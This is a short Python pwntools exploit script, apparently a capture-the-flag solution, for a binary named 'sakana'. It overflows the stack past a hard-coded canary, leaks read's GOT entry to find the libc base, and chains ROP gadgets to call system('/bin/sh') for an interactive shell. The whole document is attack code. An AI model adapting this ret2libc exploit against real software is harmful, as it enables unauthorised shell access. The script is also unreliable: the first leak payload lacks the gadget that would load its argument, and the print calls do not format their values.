
from pwn import *

import symbol


libc=ELF('pwn/sakana/libc-2.31.so')
elf=context.binary=ELF('pwn/sakana/sakana')
r=process('pwn/sakana/sakana')







pop_rdi=0x00000000000023a3#found in binary by ropper
ret=0x000000000000101a#also found by ropper, for stack alignment

canary=b'\x0a\x00\x00\x00\x00\x00\x00\x00'#I found the canary by brute force in guess.py

#the 1st payload finds the libc base address
payload=flat([
    b'A'*264,
    canary,
    8*b'a',
    elf.got.read,
    elf.plt.read

    
])
r.sendline(b'printf')
r.sendline(payload)
r.recvlines(2)
got_read=unpack(r.recvline()[:6].ljust(8,b'\x00'))
print('leaked got read: %x',got_read)
libc.address=got_read-libc.symbols.read
print('libc base %x',libc.address)

#the 2nd payload opens the bin/sh

payload=flat([
    b'A'*264,#pad to canary
    canary,
    8*b'a',#pad to ret
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    ret,#stack alignment
    libc.symbols.system

    
])
r.sendline(b'printf')
r.sendline(payload)
r.interactive()
r.close()